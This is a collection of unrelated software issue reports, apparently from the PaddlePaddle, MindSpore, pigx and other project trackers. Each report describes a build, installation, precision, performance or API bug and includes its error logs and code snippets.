使用pip install paddlepaddle，安装paddlepaddle出错,难道我安装的pip不对？？怎么找不paddlepaddle，是不是因为我的是Ubuntu14.04   <code>: Could not find any downloads that satisfy the requirement paddlepaddle Cleaning up... No distributions at all found for paddlepaddle Storing debug log for failure in /root/.pip/pip.log
[CT][MS][crowd-funding]Accuracy issues of vmap test cases for ResizeLinear1D on GPU backend.,"GPU环境vmap正反向精度问题 / 硬件环境: GPU /GPU/ : -- MindSpore version :master/1.8 -- Python version :Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : (/): pynative graph /mode pynative /mode graph test_resize_linear_1d_forward_vmap[6-input_shape_and_improve_time4-align_corners] test_resize_linear_1d_forward_vmap[6-input_shape_and_improve_time4-half_pixel] test_resize_linear_1d_grad_vmap[6-input_shape_and_improve_time4-align_corners] test_resize_linear_1d_grad_vmap[6-input_shape_and_improve_time4-half_pixel] pytest -s -v test_resizelinear1d.py::test_resize_linear_1d_forward_vmap[6-input_shape_and_improve_time4-align_corners] pytest -s -v test_resizelinear1d.py::test_resize_linear_1d_forward_vmap[6-input_shape_and_improve_time4-half_pixel] pytest -s -v test_resizelinear1d.py::test_resize_linear_1d_grad_vmap[6-input_shape_and_improve_time4-align_corners] pytest -s -v test_resizelinear1d.py::test_resize_linear_1d_grad_vmap[6-input_shape_and_improve_time4-half_pixel] 1.test_resize_linear_1d_forward_vmap[6-input_shape_and_improve_time4-align_corners] 2.test_resize_linear_1d_forward_vmap[6-input_shape_and_improve_time4-half_pixel] 3.test_resize_linear_1d_grad_vmap[6-input_shape_and_improve_time4-align_corners] 4.test_resize_linear_1d_grad_vmap[6-input_shape_and_improve_time4-half_pixel]   <code>: coordinate_transformation_mode = 'align_corners', input_shape_and_improve_time = ((128, 128, 1, 1, 3), 8), size = 6 def test_resize_linear_1d_forward_vmap( coordinate_transformation_mode, input_shape_and_improve_time, size): context.set_context(max_call_depth=30000) fact = ResizeLinear1DFactory(input_shape=input_shape_and_improve_time[0], size=size, coordinate_transformation_mode=coordinate_transformation_mode) &gt; fact.forward_vmap_cmp(improve_times=input_shape_and_improve_time[1]) E AssertionError: E data_expected_std:[0. 0. 0. ... 0. 0. 0.] E data_me_error:[-0.25682157 0.1434859 -0.5706786 ... -0.26406905 0.29992616 E 0.8639214 ] E loss:[0.25682157 0.1434859 0.5706786 ... 0.26406905 0.29992616 0.8639214 ] coordinate_transformation_mode = 'half_pixel', input_shape_and_improve_time = ((128, 128, 1, 1, 3), 8), size = 6 def test_resize_linear_1d_forward_vmap( coordinate_transformation_mode, input_shape_and_improve_time, size): context.set_context(max_call_depth=30000) fact = ResizeLinear1DFactory(input_shape=input_shape_and_improve_time[0], size=size, coordinate_transformation_mode=coordinate_transformation_mode) &gt; fact.forward_vmap_cmp(improve_times=input_shape_and_improve_time[1]) E AssertionError: E data_expected_std:[0. 0. 0. ... 0. 0. 0.] E data_me_error:[-0.3310998 -0.09291372 0.5565938 ... -0.98381776 -0.8761637 E -0.82233673] E loss:[0.3310998 0.09291372 0.5565938 ... 0.98381776 0.8761637 0.82233673] coordinate_transformation_mode = 'align_corners', input_shape_and_improve_time = ((128, 128, 1, 1, 3), 8), size = 6 def test_resize_linear_1d_grad_vmap( coordinate_transformation_mode, input_shape_and_improve_time, size): context.set_context(max_call_depth=30000) fact = ResizeLinear1DFactory(input_shape=input_shape_and_improve_time[0], size=size, coordinate_transformation_mode=coordinate_transformation_mode) &gt; fact.grad_vmap_cmp(improve_times=input_shape_and_improve_time[1]) E AssertionError: E data_expected_std:[-0.3280666 -0.24792622 0. ... 0. 0. E 0. ] E data_me_error:[-0.40901244 -2.6247249 1.6662815 ... 1.7942969 1.9073256 E -0.39432323] E loss:[0.08094585 2.3767986 1.6662815 ... 1.7942969 1.9073256 0.39432323] coordinate_transformation_mode = 'half_pixel', input_shape_and_improve_time = ((128, 128, 1, 1, 3), 8), size = 6 def test_resize_linear_1d_grad_vmap( coordinate_transformation_mode, input_shape_and_improve_time, size): context.set_context(max_call_depth=30000) fact = ResizeLinear1DFactory(input_shape=input_shape_and_improve_time[0], size=size, coordinate_transformation_mode=coordinate_transformation_mode) &gt; fact.grad_vmap_cmp(improve_times=input_shape_and_improve_time[1]) E AssertionError: E data_expected_std:[-0.6016343 -0.01257135 0. ... 0. 0. E 0. ] E data_me_error:[-0.82074285 -1.5953069 -2.0114212 ... -1.2388694 -1.3323979 E -0.10511932] E loss:[0.21910852 1.5827355 2.0114212 ... 1.2388694 1.3323979 0.10511932]"
Add `FindNCCL2.cmake`,"nccl2 are used by fluid right now. However, ncc2 is not a free software. We cannot include it in external projects. However, we need a better error log when nccl2 is not installed when compiling fluid. We need to write a .   <code>: FindNCCL2.cmake"
[CT][MS][parallel]dataparallel raise error:Cannot find backend node of node,": /device gpu : -- MindSpore version :master -- Python version :3.7 -- OS platform and distribution :Linux -- GCC/Compiler version : test_dataparallel_incremental_train_opt1_ftrl_opt2_momentum_lr1_group_lr2_tuple_scale1_dynamic_scale2_static test_dataparallel_incremental_train_opt1_ftrl_opt2_momentum_lr1_group_lr2_tuple_scale1_static_scale2_dynamic test_dataparallel_incremental_train_opt1_momentum_opt2_adam_lr1_group_lr2_list_scale1_none_scale2_dynamic test_dataparallel_incremental_train_opt1_momentum_opt2_ftrl_lr1_list_lr2_float_scale1_static_scale2_none test_dataparallel_incremental_train_opt1_momentum_opt2_momentum_lr1_list_lr2_list_scale1_dynamic_scale2_dynamic None test_loss_scale_parallel_overflow test_loss_scale_parallel_partly_overflow test_optimizer_parallel_8p_11_parameter_moment_automixed_precision_dynamic_sink_true_size_4_update_moment test_optimizer_parallel_8p_11_parameter_moment_automixed_precision_fix_sink_true_size_1_update_moment cd /home/wys/code/MindSporeTest/parallel/mixed_precision ../../share/parallel/tool/pytest_parallel.sh -r /root/mindspore/hccl/hccl_8p.json -s 8 -b 0 -e 7 -f test_dataparallel_incremental_train.py -t test_dataparallel_incremental_train_opt1_ftrl_opt2_momentum_lr1_group_lr2_tuple_scale1_dynamic_scale2_static dataparallel raise error:Cannot find backend node of node case pass [INFO] VM(34469,7f26187c5740,python):2021-07-01-02:55:03.639.138 [mindspore/ccsrc/vm/backend.cc:369] CompileGraph] Compile cut segment, the cut node: Default/Return-op662 [ERROR] RUNTIME_FRAMEWORK(34469,7f26187c5740,python):2021-07-01-02:55:03.639.288 [mindspore/ccsrc/runtime/framework/control_node_parser.cc:1285] FetchBackendInputNodebyFrontNode] Cannot find backend node of node:589_586_520_385_construct_wrapper.279:grad{[0]: ValueNode AllReduce, [1]: [CNode]89} [INFO] DEBUG(34469,7f26187c5740,python):2021-07-01-02:55:03.639.302 [mindspore/ccsrc/debug/trace.cc:501] GetEvalStackInfo] Get graph analysis information begin [INFO] DEBUG(34469,7f26187c5740,python):2021-07-01-02:55:03.639.306 [mindspore/ccsrc/debug/trace.cc:504] GetEvalStackInfo] Length of analysis information stack is empty. ^[[31mF^[[0m ^[[1m parallel_dataset = FakeData(size=32, batch_size=4, image_size=(3, 8, 8), num_classes=12,^[[0m ^[[1m use_parallel=True)^[[0m ^[[1m fact.parallel_ckpt = fact.mindspore_data_parallel_impl(dataset=parallel_dataset, epoch=1,^[[0m ^[[1m&gt; device_num=8)^[[0m ^[[1m^[[31m../test_dataparallel_incremental_train.py^[[0m:478: ^[[1m^[[31m../test_dataparallel_incremental_train.py^[[0m:133: in mindspore_data_parallel_impl ^[[1m model1.train(epoch, dataset, dataset_sink_mode=self.dataset_sink_mode)^[[0m ^[[1m^[[31m/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/model.py^[[0m:637: in train ^[[1m sink_size=sink_size)^[[0m ^[[1m^[[31m/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/model.py^[[0m:431: in _train ^[[1m self._train_process(epoch, train_dataset, list_callback, cb_params)^[[0m ^[[1m^[[31m/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/model.py^[[0m:556: in _train_process ^[[1m outputs = self._train_network(*next_element)^[[0m ^[[1m^[[31m/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py^[[0m:381: in call ^[[1m out = self.compile_and_run(*inputs)^[[0m ^[[1m^[[31m/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py^[[0m:639: in compile_and_run ^[[1m self.compile(*inputs)^[[0m ^[[1m^[[31m/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py^[[0m:626: in compile ^[[1m _executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode)^[[0m self = &lt;mindspore.common.api._Executor object at 0x7f25be8fea50&gt; obj = TrainOneStepWithLossScaleCell&lt; (network): WithLossCell&lt; (_backbone): Conv2dReduceMeanL1&lt; (layer): ConvBias...rningRate&lt;&gt; &gt; (grad_reducer): DistributedGradReducer&lt;&gt; (loss_scaling_manager): DynamicLossScaleUpdateCell&lt;&gt; phase = '1train.1625079303388065536', do_convert = True auto_parallel_mode = False args = (Tensor(shape=[4, 3, 8, 8], dtype=Float32, value= [[[[ 1.84959126e+00, -2.14166656e-01, -4.99016643e-01 ... 1.9275385...000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00]])) &gt; (grad_reducer): DistributedGradReducer&lt;&gt; (loss_scaling_manager): DynamicLossScaleUpdateCell&lt;&gt; phase = '1train.1625079303388065536', do_convert = True auto_parallel_mode = False args = (Tensor(shape=[4, 3, 8, 8], dtype=Float32, value= [[[[ 1.84959126e+00, -2.14166656e-01, -4.99016643e-01 ... 1.9275385...000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00]])) ^[[1m def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False):^[[0m ^[[1m """"""^[[0m ^[[1m Compiles graph.^[[0m ^[[1m ^[[0m ^[[1m Args:^[[0m ^[[1m obj (Function/Cell): The function or cell instance need compile.^[[0m ^[[1m args (tuple): Function or cell input arguments.^[[0m ^[[1m phase (str): The name of compile phase. Default: 'predict'.^[[0m ^[[1m do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph.^[[0m ^[[1m auto_parallel_mode: When set to True, use auto parallel mode to compile graph.^[[0m ^[[1m ^[[0m ^[[1m Return:^[[0m ^[[1m Str, the full phase of the cell.^[[0m ^[[1m Bool, if the graph has been compiled before, return False, else return True.^[[0m ^[[1m """"""^[[0m ^[[1m ^[[0m ^[[1m args_names, args_list = _generate_pip_args(obj, *args)^[[0m ^[[1m dic = dict(zip(args_names, args_list))^[[0m ^[[1m key = generate_key(phase, dic)^[[0m ^[[1m obj.phase_prefix = str(key[1])^[[0m ^[[1m if 'export' in phase:^[[0m ^[[1m phase = phase + '.' + obj.phase_prefix + '.' + str(obj.create_time)^[[0m ^[[1m else:^[[0m ^[[1m phase = obj.phase_prefix + phase + '.' + str(obj.create_time)^[[0m ^[[1m ^[[0m ^[[1m if phase in self.compile_cache.keys():^[[0m ^[[1m logger.debug(""%r graph has existed."", phase)^[[0m ^[[1m return phase, False^[[0m ^[[1m ^[[0m ^[[1m obj.check_names()^[[0m ^[[1m _check_full_batch()^[[0m ^[[1m self._set_dataset_mode(args_list)^[[0m ^[[1m ^[[0m ^[[1m is_sink_mode = args and isinstance(args[0], Tensor) and args[0].virtual_flag^[[0m ^[[1m if auto_parallel_mode and _need_to_full() and not is_sink_mode and obj.auto_parallel_compile_and_run():^[[0m ^[[1m args_full = _to_full_tensor(args, _get_device_num(), _get_global_rank())^[[0m ^[[1m _, args_list = _generate_pip_args(obj, *args_full)^[[0m ^[[1m ^[[0m ^[[1m enable_debug_runtime = context.get_context(""enable_debug_runtime"")^[[0m ^[[1m enable_ge = context.get_context(""enable_ge"")^[[0m ^[[1m use_vm = not enable_ge or (enable_debug_runtime and context.get_context(""mode"") == context.PYNATIVE_MODE)^[[0m ^[[1m&gt; result = self._executor.compile(obj, args_list, phase, use_vm, self.queue_name)^[[0m ^[[1m^[[31mE RuntimeError: mindspore/ccsrc/runtime/framework/control_node_parser.cc:1285 FetchBackendInputNodebyFrontNode] Cannot find backend node of node:589_586_520_385_construct_wrapper.279:grad{[0]: ValueNode AllReduce, [1]: [CNode]89}^[[0m ^[[1m^[[31mE ^[[0m ^[[1m^[[31mE #^[[0m ^[[1m^[[31m/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py^[[0m:531: RuntimeError   <code>: ''' TEST_SUMMARY:opt1=""ftrl"", opt2=""Momentum"", lr1=""float"", lr2=""list"", dataset_sink_mode=False, amp_level1=""O3"", amp_level2=""O2"", loss_scale1=""dynamic"", loss_scale1=""static"" ''' def test_dataparallel_incremental_train_opt1_ftrl_opt2_momentum_lr1_group_lr2_tuple_scale1_dynamic_scale2_static(): inputs_np = np.random.randn(128, 3, 2, 1024).astype(np.float32) fact = ParallelIncrementalFactory(opt1=""Ftrl"", opt2=""Momentum"", lr1=""float"", lr2=""list"", dataset_sink_mode=False, amp_level1=""O3"", amp_level2=""O2"", scale_manager1=DynamicLossScaleManager(), scale_manager2=FixedLossScaleManager()) standalone_dataset = FakeData(size=32, batch_size=32, image_size=(3, 8, 8), num_classes=12) fact.standalone_ckpt = fact.mindspore_standalone_impl(dataset=standalone_dataset, epoch=1) parallel_dataset = FakeData(size=32, batch_size=4, image_size=(3, 8, 8), num_classes=12, use_parallel=True) fact.parallel_ckpt = fact.mindspore_data_parallel_impl(dataset=parallel_dataset, epoch=1, device_num=8) fact.checkpoint_cmp(inputs_np=inputs_np)"
CMake Error at cmake/inference_lib.cmake:270编译错误,PaddlePaddle v1.7.0 OS jetson nano ubuntu18.04 ARM aarch64 cortex-a57 cuda 10.0 cudnn 7.6.3.28 python 3.6 virtualenv 本地编译 报错   <code>: cmake .. \ -DWITH_CONTRIB=OFF \ -DFLUID_INFERENCE_INSTALL_DIR=/opt/paddle \ -DWITH_MKL=OFF \ -DWITH_MKLDNN=OFF \ -DWITH_TESTING=OFF \ -DCMAKE_BUILD_TYPE=Release \ -DON_INFER=ON \ -DWITH_PYTHON=ON \ -DWITH_XBYAK=OFF \ -DWITH_NV_JETSON=ON \ -DPY_VERSION=3.6 CMake Error at cmake/inference_lib.cmake:270 (file): file failed to open for writing (No such file or directory):
Android手机读取图像数据问题。,"我根据Mobile中Android的Dome做了一个图像分类的，但是在读取出了点问题。在Java中，是把图像转成字节数组的，所以我也是这个样做，如下代码。但是pixels这个字节数组得到的结果是不定长的，但是图像明明都是3*32*32的。大小应该都是3072才对。这是为什么呢？ 就是因为上面的大小没有充满矩阵，导致array很多都是0的。 这个怎么解决？？？求解答。   <code>: public String infer(String img_path) { //把图像读取成一个Bitmap对象 Bitmap bitmap = BitmapFactory.decodeFile(img_path); ByteArrayOutputStream baos = new ByteArrayOutputStream(); bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos); //把图像生成一个字节数组 byte[] pixels = baos.toByteArray(); Log.i(""datas大小为"", String.valueOf(pixels.length)); try { baos.close(); } catch (IOException e) { e.printStackTrace(); } if (mRgbBytes == null) { mRgbBytes = new byte[3072]; } for (int i = 0; i &lt; pixels.length; i++) { mRgbBytes[i] = pixels[i]; Log.i(""ImageRecognition"", String.valueOf(mRgbBytes[i])); } // 获取预测结果 float[] result = infer(mRgbBytes); // 把概率最大的结果提取出来 float max = 0; int number = 0; for (int i = 0; i &lt; result.length; i++) { if (result[i] &gt; max) { max = result[i]; number = i; } } String msg = ""类别为："" + clasName[number] + ""，可信度为："" + max; Log.i(""ImageRecognition"", msg); return msg; } for (size_t c = 0; c &lt; 3; ++c) { for (size_t h = 0; h &lt; 32; ++h) { for (size_t w = 0; w &lt; 32; ++w) { array[index] = static_cast&lt;float&gt;(((pixels[(h * 32 + w) * 3 + c]) - means[c]) / 255.0); LOGI(""array_src:%f"", array[index]); index++; } } }"
下载静态文件Excel 内容乱码 怎样进行配置处理,"下载静态文件Excel 内容乱码 怎样进行配置处理 环境信息 pigx版本: 4.0.0 提供详细 ###代码 @RequestMapping(value = ""/downloadExcel"") @ResponseBody public void downloadExcel(HttpServletResponse res, HttpServletRequest req, String name) throws Exception { String fileName = name + "".xls""; String filePath = getClass().getResource(""/static/"" + fileName).getPath(); /** 将文件名称进行编码 */ res.setHeader(""content-disposition"", ""attachment;filename="" + URLEncoder.encode(fileName, ""UTF-8"")); res.setContentType(""content-type:octet-stream;charset=utf-8""); res.setCharacterEncoding(""UTF-8"");   <code>: BufferedInputStream inputStream = new BufferedInputStream(new FileInputStream(new File(filePath))); OutputStream outputStream = res.getOutputStream(); byte[] buffer = new byte[1024]; int len; while ((len = inputStream.read(buffer)) != -1) { /** 将流中内容写出去 .*/ outputStream.write(buffer, 0, len); } inputStream.close(); outputStream.close(); }"
fix switch layer sigle prim cell,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : def test_switch_layer_with_single_prim(): class SwitchLayerCell(nn.Cell): def init(self): super(SwitchLayerCell, self).init() self.layers = (nn.ReLU(), nn.ReLU()) self.z3 = Parameter( Tensor(np.full([128, 96], 0.6, dtype=np.float32)), name='z3') eroro raised for the testcase pass   <code>: def construct(self, index, x): ret = self.layers[index](x) * self.z3 return ret index = Tensor(0, dtype=mstype.int32) net = SwitchLayerCell() net(index, Tensor(np.full([128, 96], 0.6, dtype=np.float32))) C.grad_by_list(net, ParameterTuple(net.trainable_params()))(index, Tensor(np.full([128, 96], 0.6, dtype=np.float32))) C.grad_all(net)(index, Tensor(np.full([128, 96], 0.6, dtype=np.float32)))"
Paddlepaddle如何求一个矩阵的MAX？类似fluid.layers.XXX的运算API,"大家好！ 现在在用paddle fluid写一些计算图，但是想写求矩阵中最大元素的值的时候，发现写不了。 我想用argmax先得坐标，然后再用crop把最大值切出来，但是报错，说是offset和input向量的维度不一致。但是paddlepaddle好像也没有类似numpy.squeeze的API。 报错： 请求大神指点一下怎么做。感谢各位！   <code>: logits_i_not_t = fluid.layers.elementwise_mul(screen_target_logit,logits) logit_target = fluid.layers.elementwise_mul(target,logits) maxlogit_i_not_t = fluid.layers.argmax(logits_i_not_t,axis=1) crop = fluid.layers.crop(logits_i_not_t, shape=shape, offsets=maxlogit_i_not_t) Traceback (most recent call last): File ""cw_unit_test.py"", line 219, in &lt;module&gt; fetch_list=[loss]) File ""/usr/local/lib/python2.7/dist-packages/paddle/fluid/executor.py"", line 449, in run self.executor.run(program.desc, scope, 0, True, True) paddle.fluid.core.EnforceNotMet: enforce rank == offsets_tensor-&gt;dims()[0] failed, 2 != 1 Offsets size should be equal to dimension size of input tensor. at [/paddle/paddle/fluid/operators/crop_op.h:41] PaddlePaddle Call Stacks: 0 0x7f303e122896p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 486"
double free or corruption ,"在调用CAPI进行打分的时候，加载都没有问题。但是运行到这行代码就会爆出如图所示的错误。请问这是什么原因呢？？   <code>: paddle_gradient_machine_forward(machine, in_args, out_args, false);"
docker build on CUDA 8,"CUDA 7.5 images can not run on new generation Pascal architectures. A lot of GPUs are now pascal: GTX 1060, GTX 1070, GTX 1080, Pascal Titan X. I think we need to switch to CUDA 8.0 for our docker images. I tried to compile CUDA 8 by switch dev build dockerfile and production image dockerfile based on cuda-8. But it does not work: When running paddle from built image, I got: Maybe @gangliao understands more about the build process.   <code>: ImportError: libcudart.so.7.5: cannot open shared object file: No such file or director"
设置小程序首页时，新增富文本之后列表页面报错,app/common/model/Page.php 修改为： app/common/library/helper.php 新增function   <code>: /** * 获取器：格式化页面数据 * @param $json * @return array */ public function getPageDataAttr(string $json) { // 数据转义 $array = helper::jsonDecode($json); $array = helper::decodeHTML($array); // 合并默认数据 return $this-&gt;_mergeDefaultData($array); } /** * 修改器：自动转换data为json格式 * @param array $value * @return string */ public function setPageDataAttr(array $value){ return helper::jsonEncode($value ?: ['items' =&gt; []]); } /** * 对象转义html内容 * @param $json * @return array */ public static function decodeHTML($obj){ if($obj == null){ return null; } if(is_string($obj)){ return htmlspecialchars_decode($obj); } if(is_array($obj)){ foreach ($obj as &amp;$item) { $item = helper::decodeHTML($item); } }else if(is_object($obj)){ foreach ($obj as $key =&gt; &amp;$value) { $value = helper::decodeHTML($value); } } return $obj; }
Add support for loading from buffer for inference framework,This is a follow up to PR #8024:Multi-card mode does not work. The basic idea is to have 2 additional functions to support loading from buffer instead of files.   <code>: load()
The usage of parent scope in the scope design.,"The scope has a parent scope with type and has a constructor for it: But the scope pointer is used in the operator as follows: In the recurrent operator, we want to create a new local scope with a global parent scope. The global parent scope is passed by the network. There is a potential danger. If the local scope is released, reference count of parent scope will be decrease to zero, then the parent scope, namely global scope, will be released too. We can simply test this case in the as follows. There will be an error.   <code>: shared_ptr explicit Scope(const std::shared_ptr&lt;Scope&gt;&amp; parent) : parent_(parent) {} class OpContext { public: Scope* scope; DeviceContext* device_context; }; scope_test.cc TEST(Scope, Parent) { using paddle::framework::Scope; using paddle::framework::Variable; // auto parent_scope = std::make_shared&lt;Scope&gt;(); Scope* parent_scope = new Scope(); Variable* var0 = parent_scope-&gt;CreateVariable(""a""); EXPECT_NE(var0, nullptr); { auto scope = std::make_shared&lt;Scope&gt;(std::shared_ptr&lt;Scope&gt;(parent_scope)); /// GetVariable will get Variable from parent scope if exist. Variable* var1 = scope-&gt;GetVariable(""a""); EXPECT_EQ(var0, var1); } // the scope will be released Variable* var2 = parent_scope-&gt;GetVariable(""a""); EXPECT_EQ(var0, var2); }"
终端管理，修改授权模式，点击“保存”，出错,pigx版本: 3.6 是否修改包名: 否 终端管理，修改授权模式，点击“保存”，序列化出错： Uncaught (in promise) Error: JSON parse error: Cannot deserialize instance of out of START_ARRAY token; nested exception is com.fasterxml.jackson.databind.exc.MismatchedInputException: Cannot deserialize instance of out of START_ARRAY token 前端打印post数据： 感觉authorizedGrantTypes应该是字符串才对 如截图1： 详细回显步骤 1、选择【终端管理】 2、选择一条记录 3、修改授权模式，增加或者减少一个选项 4、点击【保存】，出错   <code>: java.lang.String java.lang.String
avue 表格显示错位,pigx版本: 3.3   <code>: 表格设置height属性，表头和下面的内容不能对齐
java.lang.UnsupportedOperationException: class org.beetl.sql.core.mapping.StreamData,方法如下：   <code>: StreamData&lt;Data&gt; select();
dropdown-menu-border-color 调整,dropdown-menu-border-color 调整 无 组件版本 latest 浏览器 all Server Side Web Assembly   <code>: .dropdown-menu { --bs-dropdown-border-color: #ced4da; }
Android Studio 3.2 编译开源中国源码,直接下载下载源码用 as 3.2 编译会报各种错误，以下是解决方案： 注意版本 gradle 使用 3.5 classpath 'com.android.tools.build:gradle:2.2.3' classpath 'com.getkeepsafe.dexcount:dexcount-gradle-plugin:0.6.2' local.properties 中定义以下变量，请不要关心变量的值 通过以上设置成功在 as 3.2 编译成功。   <code>: AES_KEY = 1234567891234567 AES_IV = 9876543217894561 VIOLET_PASSCODE = 123
Loss falls too fast on CPU with Parallel Executor ,When I try to reproduce ResNet50 MKL training benchmark with the scripts you provided https://github.com/PaddlePaddle/Paddle/issues/11620 with I found that loss value falls strangely fast from 6.96 to 0.00363376 during 60 iterations. You can see it from below figure. Look forwards to your response.   <code>: export CPU_NUM=32 python train_resnet.py --display_step=1 --warmup=0 --use_gpu=false --number_iteration=20 --skip_first_steps=5 --batch_size_per_trainer=2
[CT][MS][HardSigmoid]api 文档的公式以及样例有些问题,"api 文档的公式以及样例有些问题 /mode graph   <code>: &gt;&gt;&gt; x = Tensor(np.array([ -3.5, 0, 4.3]), mindspore.float32) &gt;&gt;&gt; output = ops.hardsigmoid(x) &gt;&gt;&gt; print(output)"
"附件上传限制文件类型时, 文件选择对话框需要限制文件类型","JDK版本： openjdk_8_201 erupt版本： 1.10.6   <code>: @EruptField( views = @View( title = ""产品视频"" ), edit = @Edit( title = ""产品视频"", type = EditType.ATTACHMENT, search = @Search, attachmentType = @AttachmentType(fileTypes = {""mp4""}) ) ) private String video = """";"
Python help outputs operator documents,The following code snippet automatically exports operators into Python layer functions: https://github.com/PaddlePaddle/Paddle/blob/6d649d9ebd2be27f796e07cf79d26d5e8539d2f3/python/paddle/v2/framework/layers.py#L111-L179 We need to improve it so that users can use Python's function to retrieve the document of the layer/operator.   <code>: help
字典假删方案,"现在在sysdictata中提供了两个字段Status(2删除) Isdelete 但是删除的时候直接物理删除了, 在实际场景中我们是需要做假删的 所以我的方案是 删除的做假删 dictData.Status = CommonStatus.DELETED; dictData.IsDeleted = true; 然后在加载的时候根据是否是管理员进行条件判断 然后管理员加载所有数据,非管理员加载未删除数据 然后管理员角色进去后可以看见三个状态的数据,假设这时候管理员点击删除数据状态=2的数据的时候可以进行物理删除 ,这样即使用户误删了,管理员还可以拯救一下 楼主看是否需要搞个pr   <code>: bool supperAdmin = false; var userManager = App.GetService&lt;IUserManager&gt;(); if (userManager.SuperAdmin) { supperAdmin = true; } var code = !string.IsNullOrEmpty(input.Code?.Trim()); var value = !string.IsNullOrEmpty(input.Value?.Trim()); var dictDatas = await _sysDictDataRep.DetachedEntities .Where(u =&gt; u.TypeId == input.TypeId) .Where((code, u =&gt; EF.Functions.Like(u.Code, $""%{input.Code.Trim()}%"")), (value, u =&gt; EF.Functions.Like(u.Value, $""%{input.Value.Trim()}%""))) .Where(u =&gt; (u.Status != CommonStatus.DELETED &amp;&amp; !supperAdmin) || (u.Status &lt;= CommonStatus.DELETED &amp;&amp; supperAdmin)).OrderBy(u =&gt; u.Sort) .Select(u =&gt; u.Adapt&lt;DictDataOutput&gt;()) .ToPagedListAsync(input.PageNo, input.PageSize); return XnPageResult&lt;DictDataOutput&gt;.PageResult(dictDatas); var dictData = await _sysDictDataRep.FirstOrDefaultAsync(u =&gt; u.Id == input.Id); if (dictData == null) throw Oops.Oh(ErrorCode.D3004); if(dictData.Status== CommonStatus.DELETED) { await _sysDictDataRep.DeleteAsync(); } else { dictData.Status = CommonStatus.DELETED; dictData.IsDeleted = true; await _sysDictDataRep.UpdateAsync(dictData); }"
富文本框里上传图片失败,"根据开发文档-常见问题-富文本编辑器文件上传 里面的写法实现不了啊，求助，万分感谢！   <code>: $('.summernote').summernote({ height : '220px', lang : 'zh-CN', callbacks: { onImageUpload: function(files, editor, $editable) { var formData = new FormData(); formData.append(""file"", files[0]); $.ajax({ type: ""POST"", url: ctx + ""common/upload"", data: data, cache: false, contentType: false, processData: false, dataType: 'json', success: function(result) { if (result.code == web_status.SUCCESS) { $(obj).summernote('editor.insertImage', result.url, result.fileName); } else { $.modal.alertError(result.msg); } }, error: function(error) { $.modal.alertWarning(""图片上传失败。""); } }); } } });"
r.getUrl()的bug,"1. 您当前使用的版本 go 1.12, win64 2. 您当前使用的框架版本？ 1.9.2 3. 更新到最新的框架版本是否能够解决问题？ 无法 4. 问题描述？ 如代码 如果是http请求，但是这里打印的也是https://xxx.com/xxx 5. 您期望得到的结果？ 是http就http，https就是https 6. 您实际得到的结果？   <code>: func Get(r *ghttp.Request) { fmt.Println(""--Get--"", r.GetUrl()) }"
[ST][MS][NET][bert-large][GPU 8p/1p]FPS[148] can not reach 260,"bert-large网络在GPU环境训练 1p性能17/fps达不到38,8p性能148/fps达不到260 / 硬件环境: /device ascend : -- MindSpore version :r1.9 commit_id:44379cd4 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221006 MindSpore 版本：编译时间20221009160040 r1.9 commit_id:44379cd4 (/): /mode graph test_ms_bert_large_cn_news_train_check_loss_gpu_8p_0001.py test_ms_bert_large_cn_news_train_check_perf_gpu_1p_0002.py 1.cd solution_test/cases/02network/02nlp/bert/train 2.pytest -s test_ms_bert_large_cn_news_train_check_perf_gpu_1p_0002.py 3. 网络训练成功，1p性能能达到38,8p性能能达到260 走给安正气   <code>: Train epoch time: 227161.074 ms, per step time: 11358.054 ms Train epoch time: 34731.241 ms, per step time: 1736.562 ms Train epoch time: 34701.717 ms, per step time: 1735.086 ms Train epoch time: 34609.824 ms, per step time: 1730.491 ms Train epoch time: 34582.973 ms, per step time: 1729.149 ms Train epoch time: 34803.168 ms, per step time: 1740.158 ms Train epoch time: 34486.342 ms, per step time: 1724.317 ms Train epoch time: 34450.758 ms, per step time: 1722.538 ms Train epoch time: 34583.315 ms, per step time: 1729.166 ms Train epoch time: 34515.041 ms, per step time: 1725.752 ms Train epoch time: 34609.228 ms, per step time: 1730.461 ms Train epoch time: 34532.082 ms, per step time: 1726.604 ms Train epoch time: 34456.404 ms, per step time: 1722.820 ms Train epoch time: 34452.404 ms, per step time: 1722.620 ms Train epoch time: 34424.556 ms, per step time: 1721.228 ms Train epoch time: 34483.534 ms, per step time: 1724.177 ms Train epoch time: 34354.331 ms, per step time: 1717.717 ms Train epoch time: 34705.803 ms, per step time: 1735.290 ms Train epoch time: 34780.121 ms, per step time: 1739.006 ms Train epoch time: 34498.073 ms, per step time: 1724.904 ms Train epoch time: 34444.070 ms, per step time: 1722.204 ms Train epoch time: 34568.421 ms, per step time: 1728.421 ms Train epoch time: 34610.660 ms, per step time: 1730.533 ms Train epoch time: 34732.686 ms, per step time: 1736.634 ms Train epoch time: 34624.258 ms, per step time: 1731.213 ms Train epoch time: 34528.357 ms, per step time: 1726.418 ms Train epoch time: 34580.022 ms, per step time: 1729.001 ms Train epoch time: 34955.069 ms, per step time: 1747.753 ms"
